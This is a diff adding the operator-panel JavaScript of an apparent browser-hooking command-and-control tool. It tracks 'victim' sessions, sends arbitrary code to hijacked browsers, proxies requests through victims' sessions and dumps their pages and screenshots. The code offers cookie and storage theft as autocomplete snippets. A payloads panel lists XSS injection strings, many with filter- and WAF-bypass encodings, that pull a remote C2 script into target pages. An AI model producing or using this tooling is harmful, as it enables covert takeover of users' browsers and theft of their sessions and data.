+    }).then(function(res){ return res.json(); }).then(function(m){
+      if (m.ok===false){ r.status="error"; r.msg="Send failed: "+(m.error||""); }
+      else { r.cid = m.cid; }                          // 명령 히스토리 행과 매칭
+    }).catch(function(e){ r.status="error"; r.msg="Error: "+e; });
+  },
+  "/html": function() {
+    if (!active) { appendErr("No victim session"); return; }
+    var vid = active;
+    slashResults[vid] = slashResults[vid] || [];
+    if (slashResults[vid].some(function(r){ return r.type==="html"&&r.status==="pending"; })){
+      appendErr("HTML dump already in progress…"); return;
+    }
+    var r = {type:"html", status:"pending", msg:"", polls:0, vid:vid, prevT:"", display:"/html"};
+    slashResults[vid].push(r);
+    fetch("/api/state").then(function(res){ return res.json(); }).then(function(d){
+      r.prevT = (d.html_t||{})[vid] || "";
+      return fetch("/api/send",{method:"POST",body:JSON.stringify({id:vid,cmd:"bx.htmldump()"})});
+    }).then(function(res){ return res.json(); }).then(function(m){
+      if (m.ok===false){ r.status="error"; r.msg="Send failed: "+(m.error||""); }
+      else { r.cid = m.cid; }                          // 명령 히스토리 행과 매칭
+    }).catch(function(e){ r.status="error"; r.msg="Error: "+e; });
+  }
+};
+
+/* ═══════════ Lightbox ═══════════ */
+function openLightbox(src){
+  var lb=$("lboverlay"), img=$("lbimg");
+  img.src=src; lb.style.display="flex";
+}
+function closeLightbox(){
+  $("lboverlay").style.display="none"; $("lbimg").src="";
+}
+document.addEventListener("keydown",function(e){ if(e.key==="Escape") closeLightbox(); });
+
+/* ═══════════ Proxy modal ═══════════ */
+function openProxy(url){
+  $("pxurlf").value=url||""; $("pxres").style.display="none"; $("pxres").textContent="";
+  $("pxmodal").classList.add("open"); $("pxurlf").focus();
+}
+$("pxopenbtn").addEventListener("click",function(){ openProxy(""); });
+$("pxcancelbtn").addEventListener("click",function(){ $("pxmodal").classList.remove("open"); });
+$("pxmodal").addEventListener("click",function(e){ if(e.target===$("pxmodal")) $("pxmodal").classList.remove("open"); });
+$("pxsendbtn").addEventListener("click",function(){
+  var url=$("pxurlf").value.trim(); if(!url||!active) return;
+  $("pxres").textContent="Sending request…"; $("pxres").style.display="block";
+  fetch("/api/send",{method:"POST",body:JSON.stringify({id:active,cmd:"await bx.proxy("+JSON.stringify(url)+")"})})
+    .then(function(r){ return r.json(); })
+    .then(function(m){
+      if(m.ok===false){ $("pxres").textContent="✖ "+m.error; return; }
+      var cid=m.cid, tries=0;
+      var poll=setInterval(function(){
+        tries++;
+        fetch("/api/state").then(function(r){ return r.json(); }).then(function(d){
+          var cmd=(d.commands||[]).find(function(x){ return x.cid===cid; });
+          if(cmd&&cmd.state==="DONE"){
+            clearInterval(poll);
+            $("pxres").textContent=(cmd.err?"✖ "+cmd.err:cmd.out||"(empty)").slice(0,4000);
+          } else if(tries>30){ clearInterval(poll); $("pxres").textContent="(Timeout)"; }
+        }).catch(function(){});
+      },500);
+    })
+    .catch(function(err){ $("pxres").textContent="Error: "+err; });
+});
+
+/* ═══════════ Payloads panel ═══════════ */
+var plFilt = "";
+function plC2Base(){
+  var v = (localStorage.pl_c2 || "").trim();
+  if (!v) return location.origin;
+  if (!/^https?:\/\//i.test(v)) v = "http://" + v;
+  return v.replace(/\/+$/, "");
+}
+function plParts(){
+  var U = plC2Base() + "/bx.js";
+  var HP = location.host;
+  try { HP = new URL(U).host; } catch(e) {}
+  var imp = "import('" + U + "')";
+  var fcc = [];
+  for (var i=0;i<imp.length;i++) fcc.push(imp.charCodeAt(i));
+  return { U:U, HP:HP,
+           B64:btoa(imp), FCC:fcc.join(","), UENC:encodeURIComponent(U) };
+}
+var PAYLOADS = [
+  {sec:"Console trigger — paste into the victim DevTools console", items:[
+    {n:"import (shortest)", d:"module import — bx.js is served with CORS *", c:"import('{C2}')"},
+    {n:"fetch + eval", d:"when import()/modules are blocked", c:"fetch('{C2}').then(r=>r.text()).then(t=>(0,eval)(t))"},
+    {n:"script element", d:"classic loader — works everywhere", c:"var s=document.createElement('script');s.src='{C2}';document.body.appendChild(s)"},
+  ]},
+  {sec:"Basic", items:[
+    {n:"script tag", d:"standard injection", c:"<script src=\"{C2}\"><\/script>"},
+    {n:"protocol-relative", d:"short · inherits the page scheme", c:"<script src=//{HP}/bx.js><\/script>"},
+    {n:"case-mixed", d:"bypasses case-sensitive tag filters", c:"<ScRiPt sRc=\"{C2}\"><\/sCrIpT>"},
+    {n:"unclosed script", d:"last on the page only — swallows following markup", c:"<script src=\"{C2}\">"},
+  ]},
+  {sec:"Attribute breakout", items:[
+    {n:"close + script", d:"payload lands inside an attribute value", c:"\"><script src=\"{C2}\"><\/script>"},
+    {n:"img onerror + createElement", d:"when import() is blocked", c:"\"><img src=x onerror=\"s=document.createElement('script');s.src='{C2}';document.body.appendChild(s)\">"},
+    {n:"img onerror (shortest)", d:"empty src fires onerror", c:"\"><img src onerror=import('{C2}')>"},
+    {n:"svg onload", d:"unquoted attribute", c:"\"><svg onload=import('{C2}')>"},
+  ]},
+  {sec:"Tag handlers", items:[
+    {n:"svg onload", d:"bare tag", c:"<svg onload=import('{C2}')>"},
+    {n:"body onload", d:"own the <body> tag", c:"<body onload=\"import('{C2}')\">"},
+    {n:"input autofocus", d:"fires without interaction", c:"<input autofocus onfocus=import('{C2}')>"},
+    {n:"details ontoggle", d:"fires on render", c:"<details open ontoggle=import('{C2}')>"},
+    {n:"video onerror", d:"invalid src", c:"<video src=x onerror=import('{C2}')>"},
+    {n:"marquee onstart", d:"legacy tags are often unfiltered", c:"<marquee onstart=import('{C2}')>"},
+    {n:"iframe srcdoc", d:"entity-encoded — bypasses quote/angle filters", c:"<iframe srcdoc=\"&lt;script src=&quot;{C2}&quot;&gt;&lt;\/script&gt;\"><\/iframe>"},
+  ]},
+  {sec:"Encoding / filter bypass", items:[
+    {n:"HTML entities", d:"for contexts that double-decode", c:"&lt;script src=&quot;{C2}&quot;&gt;&lt;/script&gt;"},
+    {n:"URL-encoded", d:"reflected param decoded once by the server", c:"%3Cscript%20src%3D%22{UENC}%22%3E%3C%2Fscript%3E"},
+    {n:"base64 eval", d:"hides keywords from WAF", c:"<img src=x onerror=\"eval(atob('{B64}'))\">"},
+    {n:"String.fromCharCode", d:"no readable keywords at all", c:"<svg onload=\"eval(String.fromCharCode({FCC}))\">"},
+    {n:"unicode escape", d:"escape the tag keyword itself", c:"<svg onload=\"\\u0069mport('{C2}')\">"},
+  ]},
+];
+function plCode(si, ii){
+  var P=plParts(), t=PAYLOADS[si].items[ii].c;
+  return t.replace(/\{C2\}/g,P.U).replace(/\{HP\}/g,P.HP)
+          .replace(/\{B64\}/g,P.B64).replace(/\{FCC\}/g,P.FCC)
+          .replace(/\{UENC\}/g,P.UENC);
+}
+function renderPayloads(){
+  var filt=plFilt.toLowerCase();
+  $("plc2").textContent = "\u2192 " + plParts().U;
+  var html="";
+  PAYLOADS.forEach(function(sec, si){
+    var rows="";
+    sec.items.forEach(function(it, ii){
+      var code=plCode(si, ii);
+      if (filt && (it.n+" "+it.d+" "+code).toLowerCase().indexOf(filt)<0) return;
+      rows+='<div class="prow">'
+        +'<div class="pname"><div class="pn">'+esc(it.n)+'</div><div class="pd">'+esc(it.d)+'</div></div>'
+        +'<div class="pcode" data-k="'+si+':'+ii+'" title="click to copy">'+esc(code)+'</div>'
+        +'<span class="plen">'+code.length+'ch</span>'
+        +'<button class="pcopy" data-k="'+si+':'+ii+'">Copy</button>'
+        +'</div>';
+    });
+    if (rows) html+='<div class="scfg-group"><div class="scfg-title">'+esc(sec.sec)+'</div>'+rows+'</div>';
+  });
+  $("plpanel-scroll").innerHTML = html || '<div id="h-empty">No matching payload</div>';
+}
+function copyText(t){
+  if (navigator.clipboard && navigator.clipboard.writeText)
+    navigator.clipboard.writeText(t).catch(function(){ copyFallback(t); });
+  else copyFallback(t);
+}
+function copyFallback(t){
+  var ta=document.createElement("textarea");
+  ta.value=t; document.body.appendChild(ta); ta.select();
+  try{ document.execCommand("copy"); }catch(e){}
+  document.body.removeChild(ta);
+}
+$("plpanel").addEventListener("click",function(e){
+  var el=e.target.closest("[data-k]"); if (!el) return;
+  var ks=el.dataset.k.split(":");
+  copyText(plCode(+ks[0], +ks[1]));
+  var btn=el.classList.contains("pcopy")?el:el.parentElement.querySelector(".pcopy");
+  if (btn){ var o=btn.textContent; btn.textContent="✔"; setTimeout(function(){ btn.textContent=o; },900); }
+});
+$("plfinp").addEventListener("input",function(){ plFilt=this.value; renderPayloads(); });
+$("plc2f").value = (localStorage.pl_c2 || "").trim() || location.origin;
+$("plc2f").addEventListener("input",function(){
+  localStorage.pl_c2 = this.value.trim()===location.origin ? "" : this.value;
+  renderPayloads();
+});
+$("plc2reset").addEventListener("click",function(){
+  localStorage.pl_c2 = ""; $("plc2f").value = location.origin; renderPayloads();
+});
+
+/* ═══════════ Settings ═══════════ */
+function loadSettings(){
+  fetch("/config").then(function(r){ return r.json(); }).then(function(cfg){
+    $("cfg-screenshot").checked=!!cfg.screenshot;
+    $("cfg-html").checked=!!cfg.html;
+    $("cfg-pageinfo").checked=!!cfg.pageinfo;
+  }).catch(function(){});
+}
+$("scfg-save").addEventListener("click", function(){
+  var btn=this;
+  fetch("/api/config",{method:"POST",body:JSON.stringify({
+    screenshot:$("cfg-screenshot").checked,
+    html:$("cfg-html").checked,
+    pageinfo:$("cfg-pageinfo").checked
+  })}).then(function(r){ return r.json(); }).then(function(m){
+    if(m.ok){ btn.textContent="Saved ✓"; setTimeout(function(){ btn.textContent="Save"; },1500); }
+  }).catch(function(){});
+});
+
+/* ═══════════ JS autocomplete ═══════════ */
+// static snippets
+var AC_SNIP = [
+  {v:"/screenshot",d:"screenshot → inline"},
+  {v:"/html",d:"HTML dump → download"},
+  {v:"document.cookie",d:"cookies"},
+  {v:"document.title",d:"page title"},
+  {v:"document.body.innerHTML",d:"body HTML"},
+  {v:"document.documentElement.outerHTML",d:"full HTML"},
+  {v:"document.querySelector(",d:"CSS selector"},
+  {v:"document.querySelectorAll(",d:"all matching selectors"},
+  {v:"document.forms",d:"all forms"},
+  {v:"document.referrer",d:"referrer"},
+  {v:"document.URL",d:"current URL"},
+  {v:"localStorage",d:"local storage"},
+  {v:"sessionStorage",d:"session storage"},
+  {v:"JSON.stringify(localStorage)",d:"LS → JSON"},
+  {v:"JSON.stringify(sessionStorage)",d:"SS → JSON"},
+  {v:"navigator.userAgent",d:"UA string"},
+  {v:"navigator.language",d:"language"},
+  {v:"location.href",d:"URL"},
+  {v:"location.origin",d:"origin"},
+  {v:"window.opener",d:"opener"},
+  {v:"frames[0].document.cookie",d:"iframe cookies"},
+  {v:"frames[0].location.href",d:"iframe URL"},
+  {v:"fetch(",d:"fetch request"},
+  {v:"await fetch(",d:"async fetch"},
+  {v:"await bx.proxy(",d:"proxy via victim session"},
+  {v:"bx.dom.q(",d:"querySelector"},
+  {v:"bx.dom.qa(",d:"querySelectorAll"},
+  {v:"bx.dom.text(",d:"text content"},
+  {v:"bx.dom.html(",d:"innerHTML"},
+  {v:"bx.dom.click(",d:"click"},
+  {v:"bx.dom.val(",d:"input value"},
+  {v:"bx.dom.submit(",d:"form submit"},
+  {v:"Object.keys(",d:"list keys"},
+  {v:"Object.entries(",d:"key-value pairs"},
+  {v:"JSON.parse(",d:"parse JSON"},
+  {v:"JSON.stringify(",d:"stringify JSON"},
+  {v:"btoa(",d:"Base64 encode"},
+  {v:"atob(",d:"Base64 decode"},
+  {v:"performance.now()",d:"timestamp"},
+  {v:"window.__bx",d:"bxshell context"},
+  {v:"window.__bx.vars",d:"bxshell variable store"},
+];
+
+// static object property map
+var AC_PROPS = {
+  "document": ["body","head","documentElement","cookie","title","URL","referrer","domain","charset","readyState","lastModified","forms","links","images","scripts","styleSheets","defaultView","location","activeElement","querySelector","querySelectorAll","getElementById","getElementsByClassName","getElementsByTagName","createElement","createTextNode","createEvent","open","close","write","hasFocus","execCommand","exitFullscreen","addEventListener","removeEventListener"],
+  "window": ["document","location","navigator","history","screen","localStorage","sessionStorage","opener","parent","top","frames","self","name","status","closed","innerWidth","innerHeight","outerWidth","outerHeight","scrollX","scrollY","devicePixelRatio","performance","crypto","indexedDB","caches","console","alert","confirm","prompt","open","close","fetch","XMLHttpRequest","WebSocket","setTimeout","setInterval","clearTimeout","clearInterval","requestAnimationFrame","btoa","atob","JSON","Math","Date","Object","Array","Promise","Error","RegExp","getComputedStyle","matchMedia","addEventListener","removeEventListener","postMessage","__bx"],
+  "navigator": ["userAgent","language","languages","platform","cookieEnabled","onLine","vendor","appName","appVersion","hardwareConcurrency","maxTouchPoints","geolocation","clipboard","credentials","permissions","mediaDevices","serviceWorker","connection","sendBeacon"],
+  "location": ["href","protocol","host","hostname","port","pathname","search","hash","origin","reload","replace","assign","toString"],
+  "localStorage": ["getItem","setItem","removeItem","clear","key","length"],
+  "sessionStorage": ["getItem","setItem","removeItem","clear","key","length"],
+  "console": ["log","warn","error","info","debug","trace","group","groupEnd","groupCollapsed","table","clear","assert","count","countReset","time","timeEnd","timeLog","dir","dirxml"],
+  "history": ["length","state","back","forward","go","pushState","replaceState"],
+  "screen": ["width","height","availWidth","availHeight","colorDepth","pixelDepth","orientation"],
+  "performance": ["now","mark","measure","getEntries","getEntriesByType","getEntriesByName","clearMarks","clearMeasures","timing","navigation","memory"],
+  "Math": ["PI","E","LN2","LN10","LOG2E","LOG10E","SQRT2","abs","acos","acosh","asin","asinh","atan","atanh","atan2","cbrt","ceil","cos","exp","floor","hypot","log","log2","log10","max","min","pow","random","round","sign","sin","sqrt","tan","trunc"],
+  "JSON": ["parse","stringify"],
+  "Object": ["keys","values","entries","assign","create","defineProperty","freeze","seal","getOwnPropertyNames","getOwnPropertyDescriptor","getPrototypeOf","setPrototypeOf","is","fromEntries","hasOwn"],
+  "Array": ["from","isArray","of"],
+  "Promise": ["resolve","reject","all","allSettled","any","race"],
+  "bx": ["proxy","dom","vars","c2"],
+  "bx.dom": ["q","qa","text","html","click","val","submit","attr","style"],
+  "frames[0]": ["document","location","window","localStorage","sessionStorage","navigator"],
+  "frames[0].document": ["cookie","title","URL","body","querySelector","querySelectorAll","forms","referrer"],
+  "__bx": ["id","boot","vars","c2"],
+  "window.__bx": ["id","boot","vars","c2"],
+};
+
+// dynamic property cache (fetched from victim)
+var propCache = {};
+var propFetching = {};
+
+function fetchProps(expr) {
+  if (!active || propFetching[expr]) return;
+  propFetching[expr] = true;
+  var code = '(function(e){try{var o=eval(e);if(o==null)return"[]";var k=new Set();for(var p=o,i=0;p&&i<5;p=Object.getPrototypeOf(p),i++)Object.getOwnPropertyNames(p).forEach(function(n){k.add(n);});return JSON.stringify([...k].filter(function(n){return/^[a-zA-Z_$]/.test(n);}).sort().slice(0,300));}catch(x){return"[]";}})(' + JSON.stringify(expr) + ')';
+  fetch("/api/send",{method:"POST",body:JSON.stringify({id:active,cmd:code})})
+    .then(function(r){ return r.json(); })
+    .then(function(m){
+      if (!m.cid){ delete propFetching[expr]; return; }
+      var tries=0, tid=setInterval(function(){
+        if(++tries>20){clearInterval(tid);delete propFetching[expr];return;}
+        fetch("/api/state").then(function(r){ return r.json(); }).then(function(d){
+          var cmd=(d.commands||[]).find(function(c){ return c.cid===m.cid; });
+          if(cmd&&cmd.state==="DONE"){
+            clearInterval(tid); delete propFetching[expr];
+            try{ var keys=JSON.parse(cmd.out||"[]"); if(Array.isArray(keys)){ propCache[expr]=keys; if(ccmd.value) showSug(ccmd.value); } }catch(e){}
+          }
+        }).catch(function(){});
+      },500);
+    }).catch(function(){ delete propFetching[expr]; });
+}
+
+// parse 'obj.prefix' pattern
+function parseObjAccess(q) {
+  var m = q.match(/^([\s\S]*?)([a-zA-Z_$][\w.$\[\]"']*?)\.([\w]*)$/);
+  if (!m) return null;
+  return {pre:m[1], expr:m[2], prop:m[3]};
+}
+
+function buildSugList(q) {
+  if (!q) return [];
+  var ql = q.toLowerCase(), results = [], seen = {};
+  function add(item){ if(!seen[item.v]){seen[item.v]=true;results.push(item);} }
+
+  // slash: prefix match only
+  if (q.startsWith("/")) {
+    AC_SNIP.filter(function(a){ return a.v.startsWith(q); }).forEach(add);
+    return results;
+  }
+
+  // obj.prop pattern
+  var oa = parseObjAccess(q);
+  if (oa) {
+    var fullExpr = (oa.pre || "") + oa.expr;
+    var prefix = oa.prop.toLowerCase();
+    var base = q.slice(0, q.lastIndexOf(".")+1);
+    // check static props (full expr first, expr-only fallback)
+    var props = propCache[fullExpr] || AC_PROPS[fullExpr] || propCache[oa.expr] || AC_PROPS[oa.expr];
+    if (props) {
+      var startMatch = props.filter(function(p){ return !prefix || p.toLowerCase().startsWith(prefix); });
+      var containMatch = props.filter(function(p){ return prefix && !p.toLowerCase().startsWith(prefix) && p.toLowerCase().indexOf(prefix)>=0; });
+      startMatch.concat(containMatch).slice(0,15).forEach(function(p){
+        add({v:base+p, d:"", prop:p, base:base, propName:p});
+      });
+    } else if (active && !propFetching[fullExpr]) {
+      fetchProps(fullExpr);
+      add({v:q, d:"⟳ Loading properties…", loading:true});
+    }
+    if (results.length) return results.slice(0,12);
+  }
+
+  // history: prefix first
+  hist.slice().reverse().filter(function(h){ return h!==q; }).forEach(function(h){
+    if(h.startsWith(q)) add({v:h,d:"history"});
+  });
+
+  // snippets: prefix first → contains
+  AC_SNIP.filter(function(a){ return a.v.toLowerCase().startsWith(ql)&&a.v!==q; }).forEach(add);
+  AC_SNIP.filter(function(a){ return !a.v.toLowerCase().startsWith(ql)&&a.v.toLowerCase().indexOf(ql)>=0; }).forEach(add);
+
+  // history contains (backwards)
+  hist.slice().reverse().filter(function(h){ return h!==q&&!h.startsWith(q)&&h.toLowerCase().indexOf(ql)>=0; }).forEach(function(h){
+    add({v:h,d:"history"});
+  });
+
+  return results.slice(0,12);
+}
+
+// render dropdown items (match highlight)
+function renderSugItem(it, q) {
+  if (it.loading) return '<span style="color:var(--faint)">'+esc(it.d)+'</span>';
+  var v = it.v, d = it.d||"";
+  var inner;
+  if (it.base !== undefined) {
+    // obj.PROP — base dim, prop highlighted
+    var prop = it.propName || v.slice(it.base.length);
+    var searchProp = q.slice(it.base.length).toLowerCase();
+    var idx = prop.toLowerCase().indexOf(searchProp);
+    var propHtml = (idx>=0 && searchProp)
+      ? esc(prop.slice(0,idx))+'<span class="sug-hi">'+esc(prop.slice(idx,idx+searchProp.length))+'</span><span class="sug-tail">'+esc(prop.slice(idx+searchProp.length))+'</span>'
+      : '<span class="sug-tail">'+esc(prop)+'</span>';
+    inner = '<span style="color:var(--faint)">'+esc(it.base)+'</span>'+propHtml;
+  } else {
+    var ql=q.toLowerCase(), vl=v.toLowerCase(), idx2=vl.indexOf(ql);
+    if(idx2>=0 && q.length){
+      inner = esc(v.slice(0,idx2))
+        +'<span class="sug-hi">'+esc(v.slice(idx2,idx2+q.length))+'</span>'
+        +'<span class="sug-tail">'+esc(v.slice(idx2+q.length))+'</span>';
+    } else { inner = esc(v); }
+  }
+  return '<span style="flex:1;overflow:hidden;text-overflow:ellipsis">'+inner+'</span>'
+    +(d?'<span class="sug-desc">'+esc(d)+'</span>':'');
+}
+
+var sugBox=$("suggest"), sugIdx=-1, sugItems=[], _sugQ="";
+function showSug(q){
+  if (!q){ hideSug(); return; }
+  _sugQ=q;
+  sugItems=buildSugList(q);
+  if (!sugItems.length){ hideSug(); return; }
+  sugIdx=-1;
+  sugBox.innerHTML=sugItems.map(function(it,i){
+    return '<div class="sug-item" data-i="'+i+'">'+renderSugItem(it,q)+'</div>';
+  }).join("");
+  sugBox.style.display="block";
+  updateGhost(q);
+}
+function hideSug(){
+  sugBox.style.display="none"; sugIdx=-1; sugItems=[];
+  var g=$("ghost"); if(g) g.innerHTML="";
+}
+function applySug(idx){
+  if(idx<0||idx>=sugItems.length) return;
+  if(sugItems[idx].loading) return;
+  ccmd.value=sugItems[idx].v; hideSug(); ccmd.focus();
+  if(ccmd.value.slice(-1)===".") showSug(ccmd.value);
+}
+function updateGhost(q){
+  var g=$("ghost"); if(!g) return;
+  if(!sugItems.length){ g.innerHTML=""; return; }
+  var top=sugItems[0];
+  if(!top||top.loading||!top.v.startsWith(q)||top.v===q){ g.innerHTML=""; return; }
+  var suffix=top.v.slice(q.length);
+  g.innerHTML='<span style="color:transparent">'+esc(q)+'</span><span class="ghost-comp">'+esc(suffix)+'</span>';
+}
+function acceptGhost(){
+  if(!sugItems.length) return false;
+  var top=sugItems[0];
+  if(!top||top.loading||!top.v.startsWith(ccmd.value)||top.v===ccmd.value) return false;
+  ccmd.value=top.v; hideSug(); ccmd.focus();
+  showSug(top.v);
+  return true;
+}
+sugBox.addEventListener("click",function(e){
+  var it=e.target.closest(".sug-item"); if(!it) return;
+  applySug(+it.dataset.i);
+});
+ccmd.addEventListener("input",function(){ showSug(this.value); });
+ccmd.addEventListener("blur",function(){ setTimeout(hideSug,150); });
+
+/* ═══════════ Send + autocomplete unified keydown ═══════════ */
+/* local queued echo — 즉시 피드백, 다음 poll에서 서버 상태(SENT/DONE+결과)가 인계받음 */
+function echoQueued(text){
+  centries.innerHTML+='<div class="ce">'
+    +'<span class="ico"><span class="ico-prompt">›</span></span>'
+    +'<span class="bd"><span class="v-cmd">'+esc(text)+'</span>'
+    +'<span class="stbdg sb-Q">Queued</span></span>'
+    +'<span class="esrc">'+new Date().toLocaleTimeString("en",{hour12:false})+'</span>'
+    +'</div>';
+  cscroll.scrollTop=cscroll.scrollHeight;
+}
+ccmd.addEventListener("keydown", function(e){
+  // autocomplete dropdown key handling
+  if (sugBox.style.display!=="none"){
+    if (e.key==="ArrowDown"){ e.preventDefault();
+      sugIdx=Math.min(sugIdx+1,sugItems.length-1);
+      sugBox.querySelectorAll(".sug-item").forEach(function(x,i){ x.classList.toggle("on",i===sugIdx); });
+      return;
+    }
+    if (e.key==="ArrowUp"){ e.preventDefault();
+      sugIdx=Math.max(sugIdx-1,-1);
+      sugBox.querySelectorAll(".sug-item").forEach(function(x,i){ x.classList.toggle("on",i===sugIdx); });
+      return;
+    }
+    if (e.key==="Tab"){ e.preventDefault(); if(sugIdx>=0){applySug(sugIdx);}else{if(!acceptGhost()) applySug(0);} return; }
+    if (e.key==="Enter"&&sugIdx>=0){ e.preventDefault(); applySug(sugIdx); return; }
+    if (e.key==="Escape"){ hideSug(); return; }
+  }
+  // command history navigation
+  if (e.key==="ArrowUp"&&hi>0)       { this.value=hist[--hi]; e.preventDefault(); hideSug(); return; }
+  if (e.key==="ArrowDown")           { this.value=hi<hist.length-1?hist[++hi]:""; hideSug(); return; }
+  if (e.key!=="Enter") return;
+  hideSug();
+  var c=this.value.trim(); if (!c) return;
+  // slash command — 일반 명령과 동일하게 큐에 들어가 실행되는 피드백
+  if (c.charAt(0)==="/") {
+    this.value="";
+    var fn=SLASH[c];
+    if (!fn){ appendErr("Unknown command: "+esc(c)+" (available: /screenshot /html)"); return; }
+    if (!active){ appendErr("No victim session — select a victim from the tab"); return; }
+    hist.push(c); hi=hist.length;                      // ↑ 재호출 통일
+    echoQueued(c);                                     // 즉시 [Queued] 피드백
+    fn();
+    return;
+  }
+  if (!active){ appendErr("No victim session — select a victim from the tab"); return; }
+  hist.push(c); hi=hist.length; this.value="";
+  echoQueued(c);
+  fetch("/api/send",{method:"POST",body:JSON.stringify({id:active,cmd:c})})
+    .then(function(r){ return r.json(); })
+    .then(function(m){ if(m.ok===false) appendErr("Send failed: "+(m.error||"unknown")); })
+    .catch(function(err){ appendErr("fetch error: "+err); });
+});
+
+/* ═══════════ Polling start ═══════════ */
+setInterval(pollState,1500); pollState();
+setInterval(function(){ if(curPanel==="n"&&active&&!netPaused) loadNet(); },2000);
+loadSettings();
+</script>
+</body></html>
